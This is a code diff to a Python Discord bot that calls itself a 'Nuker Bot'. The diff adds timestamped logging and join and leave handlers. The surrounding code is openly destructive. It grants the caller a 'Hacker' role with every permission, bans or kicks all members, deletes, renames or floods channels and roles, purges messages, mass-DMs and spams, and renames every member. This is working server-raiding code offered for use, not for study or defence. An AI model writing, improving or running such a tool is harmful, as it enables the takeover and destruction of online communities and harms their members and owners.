@@ -2,9 +2,10 @@ import discord
 from discord.ext import commands
 import string
 import random
+from datetime import datetime
 
 TOKEN = ''
-AUTHOR_ID = 
+AUTHOR_ID =
 
 client = commands.Bot(
     command_prefix='.',
@@ -31,14 +32,35 @@ async def on_ready():
 
 
 @client.event
+async def on_guild_join(ctx):
+    now = datetime.now()
+    print(now, ': Nuker Bot was added to', ctx)
+
+
+@client.event
+async def on_guild_remove(ctx):
+    now = datetime.now()
+    print(now, ': Nuker Bot was removed from', ctx)
+
+
+@client.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.MissingPermissions):
+        now = datetime.now()
+        dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
+        print(dt_string, ':', ctx.message.author, 'attempted to execute:', ctx.message.content, 'in', ctx.guild)
         await ctx.message.delete()
         await ctx.send('🚫 **Permission Denied!**')
     if isinstance(error, commands.NotOwner):
+        now = datetime.now()
+        dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
+        print(dt_string, ':', ctx.message.author, 'attempted to execute:', ctx.message.content, 'in', ctx.guild)
         await ctx.message.delete()
         await ctx.send('🚫 **You are not the owner!**')
     if isinstance(error, commands.CheckFailure):
+        now = datetime.now()
+        dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
+        print(dt_string, ':', ctx.message.author, 'attempted to execute:', ctx.message.content, 'in', ctx.guild)
         await ctx.message.delete()
         await ctx.send('🚫 **Access Denied!**')
     else:
@@ -48,7 +70,9 @@ async def on_command_error(ctx, error):
 @client.command()
 @commands.check(allowed)
 async def help(ctx):
-    print(ctx.author, 'executed: .help in', ctx.guild)
+    now = datetime.now()
+    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
+    print(dt_string, ':', ctx.author, 'executed: .help in', ctx.guild)
     embedVar = discord.Embed(title="Commands", description="All Nuker Commands", color=0x00ff00)
     embedVar.add_field(name="Prefix", value="'.'", inline=False)
     embedVar.add_field(name="Author", value="Determined on line 12.", inline=False)
@@ -74,15 +98,17 @@ async def help(ctx):
                        inline=False)
     await ctx.send(embed=embedVar)
 
+
 @client.command()
 @commands.check(allowed)
 async def admin(ctx):
-    print(ctx.author, 'executed: .admin in', ctx.guild)
+    now = datetime.now()
+    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
+    print(dt_string, ':', ctx.author, 'executed: .admin in', ctx.guild)
     await ctx.message.delete()
     await ctx.guild.create_role(
         name='Hacker',
-        permissions=discord.Permissions.all(),
-        color=discord.Color(0x36393f)
+        permissions=discord.Permissions.all()
     )
     role = discord.utils.get(ctx.guild.roles, name='Hacker')
     await ctx.author.add_roles(role)
@@ -92,7 +118,9 @@ async def admin(ctx):
 @client.command()
 @commands.check(allowed)
 async def ban(ctx):
-    print(ctx.author, 'executed: .ban in', ctx.guild)
+    now = datetime.now()
+    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
+    print(dt_string, ':', ctx.author, 'executed: .ban in', ctx.guild)
     await ctx.message.delete()
     await ctx.send('🔨 **Banning all members!**')
     for member in ctx.guild.members:
@@ -108,7 +136,9 @@ async def ban(ctx):
 @client.command()
 @commands.check(allowed)
 async def kick(ctx):
-    print(ctx.author, 'executed: .kick in', ctx.guild)
+    now = datetime.now()
+    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
+    print(dt_string, ':', ctx.author, 'executed: .kick in', ctx.guild)
     await ctx.message.delete()
     await ctx.send('👢 **Roundhouse kicking all members!**')
     for member in ctx.guild.members:
@@ -125,8 +155,10 @@ async def kick(ctx):
 @commands.check(allowed)
 async def channel(ctx, choice):
     await ctx.message.delete()
+    now = datetime.now()
+    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
     if choice == 'create':
-        print(ctx.author, 'executed: .channel create in', ctx.guild)
+        print(dt_string, ':', ctx.author, 'executed: .channel create in', ctx.guild)
         await ctx.send('✅ **Mitosis (channels)!** Type `stop` to stop.')
 
         def check_reply(m):
@@ -143,13 +175,13 @@ async def channel(ctx, choice):
         await ctx.send('✅ **Mitosis complete!**')
 
     elif choice == 'delete':
-        print(ctx.author, 'executed: .channel delete in', ctx.guild)
+        print(dt_string, ':', ctx.author, 'executed: .channel delete in', ctx.guild)
         await ctx.send('✅ **Purging channels!**')
         for chan in ctx.guild.channels:
             await chan.delete()
 
     elif choice == 'rename':
-        print(ctx.author, 'executed: .channel rename in', ctx.guild)
+        print(dt_string, ':', ctx.author, 'executed: .channel rename in', ctx.guild)
         await ctx.send('✅ **Renaming channels!**')
         char = string.ascii_letters + string.digits
         for chan in ctx.guild.channels:
@@ -165,7 +197,9 @@ async def channel(ctx, choice):
 @commands.check(allowed)
 async def dm(ctx, *, msg=None):
     await ctx.message.delete()
-    print(ctx.author, 'executed: .dm', msg, 'in', ctx.guild)
+    now = datetime.now()
+    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
+    print(dt_string, ':', ctx.author, 'executed: .dm', msg, 'in', ctx.guild)
     if msg is not None:
         await ctx.send('✅ **Attempting to DM everyone!**')
         for member in ctx.guild.members:
@@ -187,7 +221,9 @@ async def dm(ctx, *, msg=None):
 @client.command()
 @commands.check(allowed)
 async def purge(ctx):
-    print(ctx.author, 'executed: .purge in', ctx.guild)
+    now = datetime.now()
+    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
+    print(dt_string, ':', ctx.author, 'executed: .purge in', ctx.guild)
     for tc in ctx.guild.text_channels:
         await tc.purge(bulk=True)
     await ctx.send('✅ **Purged all channels!**')
@@ -197,8 +233,10 @@ async def purge(ctx):
 @commands.check(allowed)
 async def role(ctx, choice):
     await ctx.message.delete()
+    now = datetime.now()
+    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
     if choice == 'create':
-        print(ctx.author, 'executed: .role create in', ctx.guild)
+        print(dt_string, ':', ctx.author, 'executed: .role create in', ctx.guild)
         await ctx.send('✅ **Mitosis (roles)!** Type `stop` to stop.')
 
         def check_reply(m):
@@ -214,7 +252,7 @@ async def role(ctx, choice):
         await ctx.send('✅ **Mitosis complete!**')
 
     elif choice == 'delete':
-        print(ctx.author, 'executed: .role delete in', ctx.guild)
+        print(dt_string, ':', ctx.author, 'executed: .role delete in', ctx.guild)
         await ctx.send('✅ **Purging roles!**')
         roles = ctx.guild.roles
         roles.pop(0)
@@ -225,7 +263,7 @@ async def role(ctx, choice):
                 break
 
     elif choice == 'rename':
-        print(ctx.author, 'executed: .role rename in', ctx.guild)
+        print(dt_string, ':', ctx.author, 'executed: .role rename in', ctx.guild)
         await ctx.send('✅ **Renaming roles!**')
         char = string.ascii_letters + string.digits
         for role in ctx.guild.roles:
@@ -243,7 +281,9 @@ async def role(ctx, choice):
 @client.command()
 @commands.check(allowed)
 async def spam(ctx, *, msg=None):
-    print(ctx.author, 'executed: .spam', msg, 'in', ctx.guild)
+    now = datetime.now()
+    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
+    print(dt_string, ':', ctx.author, 'executed: .spam', msg, 'in', ctx.guild)
     await ctx.message.delete()
     if msg is not None:
         await ctx.send('✅ **Spamming initiated!** Type `stop` to stop.')
@@ -268,7 +308,9 @@ async def spam(ctx, *, msg=None):
 @client.command()
 @commands.check(allowed)
 async def nickname(ctx):
-    print(ctx.author, 'executed: .nickname in', ctx.guild)
+    now = datetime.now()
+    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
+    print(dt_string, ':', ctx.author, 'executed: .nickname in', ctx.guild)
     await ctx.message.delete()
     char = string.ascii_letters + string.digits
     for member in ctx.guild.members:
@@ -283,7 +325,9 @@ async def nickname(ctx):
 @client.command()
 @commands.check(allowed)
 async def logout(ctx):
-    print(ctx.author, 'executed: .logout in', ctx.guild)
+    now = datetime.now()
+    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
+    print(dt_string, ':', ctx.author, 'executed: .logout in', ctx.guild)
     await client.logout()
 
 
